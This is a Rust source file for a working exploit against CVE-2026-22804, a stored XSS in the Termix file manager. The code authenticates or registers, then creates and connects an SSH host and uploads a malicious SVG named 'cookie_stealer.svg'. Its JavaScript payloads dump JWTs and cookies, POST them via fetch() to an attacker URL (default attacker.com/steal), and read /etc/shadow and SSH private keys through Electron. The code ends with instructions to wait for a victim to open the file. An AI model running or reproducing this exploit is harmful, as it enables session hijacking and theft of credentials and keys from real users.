//! # CVE-2026-22804: Termix Stored XSS via Malicious SVG File
//!
//! Termix is a web-based server management platform with SSH terminal, tunneling,
//! and file editing capabilities. From 1.7.0 to 1.9.0, a Stored Cross-Site Scripting
//! (XSS) vulnerability exists in the File Manager component.
//!
//! The application fails to sanitize SVG file content before rendering it using
//! `dangerouslySetInnerHTML`. This allows an attacker to upload a malicious SVG file
//! containing JavaScript that executes when a user previews the file.
//!
//! ## Attack Flow
//! 1. Authenticate with Termix backend API
//! 2. Create a managed SSH host entry
//! 3. Connect via Termix's SSH API
//! 4. Upload malicious SVG file with XSS payload
//! 5. When victim previews the SVG, JavaScript executes in Electron context
//!
//! ## Impact
//! - Session hijacking (JWT token theft from localStorage)
//! - Cookie theft
//! - Local File Inclusion (LFI) in Electron environment
//!
//! ## Affected Versions
//! - Termix 1.7.0 - 1.9.0
//!
//! ## Fixed In
//! - Termix 1.10.0
//!
//! ## Reference
//! - https://github.com/ThemeHackers/CVE-2026-22804
//! - GHSA-m3cv-5hgp-hv35

use anyhow::{Context, Result, bail};
use colored::*;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::io::Write;
use std::time::Duration;

const DEFAULT_AUTH_PORT: u16 = 30001;
const DEFAULT_FILE_PORT: u16 = 30004;
const REQUEST_TIMEOUT_SECS: u64 = 10;

/// Exploit configuration
#[derive(Debug, Clone)]
struct ExploitConfig {
    target: String,
    auth_port: u16,
    file_port: u16,
    username: String,
    password: String,
    ssh_host: String,
    ssh_port: u16,
    ssh_user: String,
    upload_path: String,
    payload_type: PayloadType,
    exfil_url: Option<String>,
}

#[derive(Debug, Clone)]
enum PayloadType {
    SessionDisplay,    // Display JWT/cookies visually
    SessionExfil,      // Exfiltrate to external URL
    LfiRead,           // Read local files (Electron)
    CustomJs,          // Custom JavaScript payload
}

impl Default for ExploitConfig {
    fn default() -> Self {
        Self {
            target: String::new(),
            auth_port: DEFAULT_AUTH_PORT,
            file_port: DEFAULT_FILE_PORT,
            username: "admin".to_string(),
            password: String::new(),
            ssh_host: "127.0.0.1".to_string(),
            ssh_port: 22,
            ssh_user: "kali".to_string(),
            upload_path: "/home/kali".to_string(),
            payload_type: PayloadType::SessionDisplay,
            exfil_url: None,
        }
    }
}

#[derive(Debug, Deserialize)]
struct LoginResponse {
    token: Option<String>,
    #[serde(rename = "userId")]
    user_id: Option<String>,
}

#[derive(Debug, Deserialize, Serialize)]
struct SshHost {
    id: Option<String>,
    name: Option<String>,
    ip: Option<String>,
    port: Option<u16>,
    username: Option<String>,
    #[serde(rename = "authType")]
    auth_type: Option<String>,
}

/// Display module banner
fn display_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   CVE-2026-22804: Termix Stored XSS via Malicious SVG             ║".cyan());
    println!("{}", "║   Session Hijacking / LFI in Electron Environment                 ║".cyan());
    println!("{}", "║   Affects Termix 1.7.0 - 1.9.0 | Fixed in 1.10.0                  ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════════════╝".cyan());
}

/// Get user configuration
fn get_user_config(target: &str) -> Result<ExploitConfig> {
    let mut config = ExploitConfig::default();
    
    println!();
    println!("{}", "=== CVE-2026-22804 Configuration ===".yellow().bold());
    println!();
    
    // Target
    config.target = if target.is_empty() {
        print!("{}", "Enter target IP/hostname: ".green());
        std::io::stdout().flush().context("Failed to flush stdout")?;
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).context("Failed to read input")?;
        let t = input.trim().to_string();
        if t.is_empty() {
            bail!("Target is required");
        }
        t
    } else {
        target.to_string()
    };
    
    let mut input = String::new();
    
    // Auth port
    print!("{}", format!("Auth API port [default: {}]: ", DEFAULT_AUTH_PORT).green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if let Ok(p) = input.trim().parse::<u16>() {
        config.auth_port = p;
    }
    
    // File port
    print!("{}", format!("File API port [default: {}]: ", DEFAULT_FILE_PORT).green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if let Ok(p) = input.trim().parse::<u16>() {
        config.file_port = p;
    }
    
    // Username
    print!("{}", "Termix username [default: admin]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if !input.trim().is_empty() {
        config.username = input.trim().to_string();
    }
    
    // Password
    print!("{}", "Termix password: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    config.password = input.trim().to_string();
    
    // SSH host to create
    print!("{}", "SSH host IP for managed server [default: 127.0.0.1]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if !input.trim().is_empty() {
        config.ssh_host = input.trim().to_string();
    }
    
    // SSH port
    print!("{}", "SSH port [default: 22]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if let Ok(p) = input.trim().parse::<u16>() {
        config.ssh_port = p;
    }
    
    // SSH username
    print!("{}", "SSH username [default: kali]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if !input.trim().is_empty() {
        config.ssh_user = input.trim().to_string();
    }
    
    // Upload path
    print!("{}", "Upload path [default: /home/kali]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    if !input.trim().is_empty() {
        config.upload_path = input.trim().to_string();
    }
    
    // Payload type
    println!();
    println!("{}", "Payload Types:".yellow());
    println!("  1. Session Display (show JWT/cookies visually)");
    println!("  2. Session Exfiltrate (send to external URL)");
    println!("  3. LFI Read (read local files - Electron only)");
    println!("  4. Custom JavaScript");
    print!("{}", "Select payload type [1-4, default: 1]: ".green());
    std::io::stdout().flush().context("Failed to flush stdout")?;
    input.clear();
    std::io::stdin().read_line(&mut input).context("Failed to read input")?;
    
    config.payload_type = match input.trim() {
        "2" => {
            print!("{}", "Exfiltration URL (e.g., https://attacker.com/steal): ".green());
            std::io::stdout().flush().context("Failed to flush stdout")?;
            input.clear();
            std::io::stdin().read_line(&mut input).context("Failed to read input")?;
            config.exfil_url = Some(input.trim().to_string());
            PayloadType::SessionExfil
        },
        "3" => PayloadType::LfiRead,
        "4" => PayloadType::CustomJs,
        _ => PayloadType::SessionDisplay,
    };
    
    println!();
    println!("{}", "[Configuration Summary]".cyan().bold());
    println!("  Target: {}:{} (auth) / {} (file)", config.target, config.auth_port, config.file_port);
    println!("  Termix User: {}", config.username);
    println!("  SSH Target: {}@{}:{}", config.ssh_user, config.ssh_host, config.ssh_port);
    println!("  Upload Path: {}", config.upload_path);
    println!();
    
    Ok(config)
}

/// Generate malicious SVG payload
fn generate_svg_payload(payload_type: &PayloadType, exfil_url: &Option<String>) -> String {
    let js_payload = match payload_type {
        PayloadType::SessionDisplay => r#"
            try {
                let store = '';
                for(let i=0; i<localStorage.length; i++) {
                    store += localStorage.key(i) + ': ' + localStorage.getItem(localStorage.key(i)) + '\\n';
                }
                document.getElementById('jwt_area').value = store || 'No localStorage found';
                document.getElementById('cookie_area').value = document.cookie || 'No cookies found';
                alert('Session Hijacking Successful!');
            } catch(e) { alert('Error: ' + e); }
        "#.to_string(),
        
        PayloadType::SessionExfil => {
            let url = match exfil_url.as_deref() {
                Some(u) => u,
                None => "https://attacker.com/steal",
            };
            format!(r#"
                try {{
                    let data = {{
                        localStorage: {{}},
                        cookies: document.cookie,
                        url: window.location.href
                    }};
                    for(let i=0; i<localStorage.length; i++) {{
                        data.localStorage[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
                    }}
                    fetch('{}', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify(data)
                    }});
                    document.getElementById('jwt_area').value = 'Data exfiltrated to: {}';
                }} catch(e) {{ console.error(e); }}
            "#, url, url)
        },
        
        PayloadType::LfiRead => r#"
            try {
                // Electron/Node.js file read via require
                const fs = require('fs');
                const files = ['/etc/passwd', '/etc/shadow', process.env.HOME + '/.ssh/id_rsa'];
                let output = '';
                files.forEach(f => {
                    try {
                        output += '=== ' + f + ' ===\n' + fs.readFileSync(f, 'utf8') + '\n\n';
                    } catch(e) { output += f + ': ' + e.message + '\n'; }
                });
                document.getElementById('jwt_area').value = output;
                alert('LFI Read Complete!');
            } catch(e) { 
                document.getElementById('jwt_area').value = 'LFI failed (not Electron?): ' + e;
            }
        "#.to_string(),
        
        PayloadType::CustomJs => r#"
            // Custom payload - modify as needed
            alert('Custom XSS Payload Executed!\nDocument: ' + document.domain);
        "#.to_string(),
    };
    
    format!(r#"<svg width="600" height="600" xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <div style="background-color:purple; color:white; font-size:24px; padding:20px; font-weight:bold; border: 5px solid black; font-family:monospace; overflow:hidden;">
        SESSION HIJACKED! <br/>
        <hr/>
        <div style="font-size:16px;">
            <strong>JWT (localStorage):</strong><br/>
            <textarea id="jwt_area" style="width:100%; height:100px; color:black;">Loading...</textarea>
            <br/>
            <strong>Cookies:</strong><br/>
            <textarea id="cookie_area" style="width:100%; height:50px; color:black;">Loading...</textarea>
        </div>
      </div>
      <img src="x" onerror="{}" style="display:none;" />
    </body>
  </foreignObject>
</svg>"#, js_payload.replace('\n', " ").replace('"', "&quot;"))
}

/// Authenticate with Termix API
async fn authenticate(client: &Client, config: &ExploitConfig) -> Result<(String, String)> {
    let auth_url = format!("http://{}:{}", config.target, config.auth_port);
    
    // Try login first
    println!("{}", format!("[*] Attempting to login as {}...", config.username).cyan());
    
    let login_res = client.post(format!("{}/users/login", auth_url))
        .json(&json!({
            "username": config.username,
            "password": config.password
        }))
        .send()
        .await;
    
    match login_res {
        Ok(res) if res.status().is_success() => {
            let login_data: LoginResponse = res.json().await.context("Failed to parse login response")?;
            if let (Some(token), Some(user_id)) = (login_data.token, login_data.user_id) {
                println!("{}", "[+] Login successful!".green());
                return Ok((token, user_id));
            }
        },
        Ok(res) => {
            println!("{}", format!("[-] Login failed: {}", res.status()).yellow());
        },
        Err(e) => {
            println!("{}", format!("[-] Login error: {}", e).yellow());
        }
    }
    
    // Try registration
    println!("{}", "[*] Attempting to register...".cyan());
    
    let register_res = client.post(format!("{}/users/create", auth_url))
        .json(&json!({
            "username": config.username,
            "password": config.password
        }))
        .send()
        .await
        .context("Failed to register")?;
    
    if register_res.status().is_success() {
        println!("{}", "[+] Registration successful!".green());
        
        // Login after registration
        let login_res = client.post(format!("{}/users/login", auth_url))
            .json(&json!({
                "username": config.username,
                "password": config.password
            }))
            .send()
            .await
            .context("Failed to login after registration")?;
        
        let login_data: LoginResponse = login_res.json().await.context("Failed to parse login response")?;
        if let (Some(token), Some(user_id)) = (login_data.token, login_data.user_id) {
            return Ok((token, user_id));
        }
    }
    
    bail!("Authentication failed - could not login or register");
}

/// Create or get SSH host entry
async fn get_or_create_host(client: &Client, config: &ExploitConfig, token: &str, user_id: &str) -> Result<SshHost> {
    let auth_url = format!("http://{}:{}", config.target, config.auth_port);
    let host_name = "Termix PoC Host";
    
    println!("{}", "[*] Getting SSH hosts...".cyan());
    
    // Get existing hosts
    let hosts_res = client.get(format!("{}/ssh/db/host", auth_url))
        .header("Authorization", format!("Bearer {}", token))
        .send()
        .await
        .context("Failed to get hosts")?;
    
    if hosts_res.status().is_success() {
        let hosts: Vec<SshHost> = match hosts_res.json().await {
            Ok(h) => h,
            Err(_) => Vec::new(),
        };
        
        // Delete existing PoC host if found
        for host in hosts {
            if host.name.as_deref() == Some(host_name) {
                if let Some(id) = &host.id {
                    println!("{}", "[*] Deleting existing PoC host...".yellow());
                    let _ = client.delete(format!("{}/ssh/db/host/{}", auth_url, id))
                        .header("Authorization", format!("Bearer {}", token))
                        .send()
                        .await;
                }
            }
        }
    }
    
    // Create new host
    println!("{}", "[*] Creating SSH host entry...".cyan());
    
    let host_data = json!({
        "userId": user_id,
        "name": host_name,
        "ip": config.ssh_host,
        "port": config.ssh_port,
        "username": config.ssh_user,
        "authType": "password",
        "password": "kali",
        "tags": ["poc"],
        "pin": 0,
        "enableTerminal": 1,
        "enableFileManager": 1,
        "enableTunnel": 0,
        "forceKeyboardInteractive": false
    });
    
    let create_res = client.post(format!("{}/ssh/db/host", auth_url))
        .header("Authorization", format!("Bearer {}", token))
        .json(&host_data)
        .send()
        .await
        .context("Failed to create host")?;
    
    if create_res.status().is_success() {
        let host: SshHost = create_res.json().await.context("Failed to parse host response")?;
        println!("{}", "[+] SSH host created successfully!".green());
        return Ok(host);
    }
    
    bail!("Failed to create SSH host: {}", create_res.status());
}

/// Connect to SSH via Termix
async fn connect_ssh(client: &Client, config: &ExploitConfig, token: &str, host: &SshHost, user_id: &str) -> Result<String> {
    let file_url = format!("http://{}:{}", config.target, config.file_port);
    
    let host_id = host.id.as_ref().context("Host ID missing")?;
    let session_id = host_id.clone();
    
    println!("{}", format!("[*] Connecting to SSH host {}...", config.ssh_host).cyan());
    
    let connect_payload = json!({
        "sessionId": session_id,
        "hostId": host_id,
        "ip": config.ssh_host,
        "port": config.ssh_port,
        "username": config.ssh_user,
        "authType": "password",
        "password": "kali",
        "userId": user_id
    });
    
    let connect_res = client.post(format!("{}/ssh/file_manager/ssh/connect", file_url))
        .header("Authorization", format!("Bearer {}", token))
        .json(&connect_payload)
        .send()
        .await
        .context("Failed to connect SSH")?;
    
    if connect_res.status().is_success() {
        println!("{}", "[+] SSH connection initiated!".green());
        
        // Wait for connection
        tokio::time::sleep(Duration::from_secs(2)).await;
        
        // Check status
        let status_res = client.get(format!("{}/ssh/file_manager/ssh/status?sessionId={}", file_url, session_id))
            .header("Authorization", format!("Bearer {}", token))
            .send()
            .await;
        
        if let Ok(res) = status_res {
            if res.status().is_success() {
                println!("{}", "[+] SSH connected successfully!".green());
            }
        }
        
        return Ok(session_id);
    }
    
    // Even if connect fails, we may be able to upload
    println!("{}", "[-] SSH connect returned non-200, continuing anyway...".yellow());
    Ok(session_id)
}

/// Upload malicious SVG file
async fn upload_payload(client: &Client, config: &ExploitConfig, token: &str, session_id: &str, host_id: &str, user_id: &str) -> Result<()> {
    let file_url = format!("http://{}:{}", config.target, config.file_port);
    let filename = "cookie_stealer.svg";
    
    let svg_content = generate_svg_payload(&config.payload_type, &config.exfil_url);
    
    println!("{}", format!("[*] Uploading malicious SVG to {}...", config.upload_path).cyan());
    
    let upload_payload = json!({
        "sessionId": session_id,
        "path": config.upload_path,
        "fileName": filename,
        "content": svg_content,
        "hostId": host_id,
        "userId": user_id
    });
    
    let upload_res = client.post(format!("{}/ssh/file_manager/ssh/uploadFile", file_url))
        .header("Authorization", format!("Bearer {}", token))
        .json(&upload_payload)
        .send()
        .await
        .context("Failed to upload file")?;
    
    if upload_res.status().is_success() {
        println!("{}", format!("[+] Malicious SVG uploaded successfully!").green().bold());
        println!();
        println!("{}", "=== EXPLOIT DEPLOYED ===".green().bold());
        println!("{}", format!("File location: {}/{}", config.upload_path, filename).cyan());
        println!();
        println!("{}", "Next Steps:".yellow());
        println!("  1. Wait for victim to open Termix File Manager");
        println!("  2. Victim navigates to: {}", config.upload_path);
        println!("  3. Victim clicks on: {}", filename);
        println!("  4. XSS payload executes, stealing JWT/cookies");
        println!();
        
        return Ok(());
    }
    
    let status = upload_res.status();
    let error_body = match upload_res.text().await {
        Ok(t) => t,
        Err(_) => String::from("(failed to read response body)"),
    };
    bail!("Failed to upload file: {} - {}", status, error_body);
}

/// Run the exploit
async fn run_exploit(config: &ExploitConfig) -> Result<()> {
    let client = Client::builder()
        .timeout(Duration::from_secs(REQUEST_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .build()
        .context("Failed to create HTTP client")?;
    
    // Step 1: Authenticate
    let (token, user_id) = authenticate(&client, config).await?;
    
    // Step 2: Create SSH host
    let host = get_or_create_host(&client, config, &token, &user_id).await?;
    
    // Step 3: Connect SSH
    let host_id = match host.id.clone() {
        Some(id) => id,
        None => String::new(),
    };
    let session_id = connect_ssh(&client, config, &token, &host, &user_id).await?;
    
    // Step 4: Upload payload
    upload_payload(&client, config, &token, &session_id, &host_id, &user_id).await?;
    
    Ok(())
}

/// Check if target is vulnerable
async fn check_vulnerable(config: &ExploitConfig) -> Result<bool> {
    let client = Client::builder()
        .timeout(Duration::from_secs(REQUEST_TIMEOUT_SECS))
        .danger_accept_invalid_certs(true)
        .build()
        .context("Failed to create HTTP client")?;
    
    let auth_url = format!("http://{}:{}", config.target, config.auth_port);
    
    println!("{}", "[*] Checking target accessibility...".cyan());
    
    // Try to reach the auth endpoint
    let res = client.get(&auth_url)
        .send()
        .await;
    
    match res {
        Ok(r) => {
            println!("{}", format!("[+] Auth API reachable: {} {}", auth_url, r.status()).green());
            
            // Check file API
            let file_url = format!("http://{}:{}", config.target, config.file_port);
            let file_res = client.get(&file_url).send().await;
            
            match file_res {
                Ok(fr) => {
                    println!("{}", format!("[+] File API reachable: {} {}", file_url, fr.status()).green());
                    println!("{}", "[!] Target appears to be running Termix - likely vulnerable (1.7.0-1.9.0)".yellow().bold());
                    return Ok(true);
                },
                Err(e) => {
                    println!("{}", format!("[-] File API not reachable: {}", e).red());
                }
            }
        },
        Err(e) => {
            println!("{}", format!("[-] Auth API not reachable: {}", e).red());
        }
    }
    
    Ok(false)
}

/// Main entry point
pub async fn run(target: &str) -> Result<()> {
    display_banner();
    
    let config = get_user_config(target)?;
    
    // Check vulnerability first
    let vulnerable = check_vulnerable(&config).await?;
    
    if !vulnerable {
        println!();
        print!("{}", "[?] Target may not be vulnerable. Continue anyway? [y/N]: ".yellow());
        std::io::stdout().flush().context("Failed to flush stdout")?;
        let mut input = String::new();
        std::io::stdin().read_line(&mut input).context("Failed to read input")?;
        
        if !input.trim().eq_ignore_ascii_case("y") {
            println!("{}", "[-] Aborted.".red());
            return Ok(());
        }
    }
    
    println!();
    println!("{}", "[*] Starting exploit...".cyan().bold());
    println!();
    
    run_exploit(&config).await
}
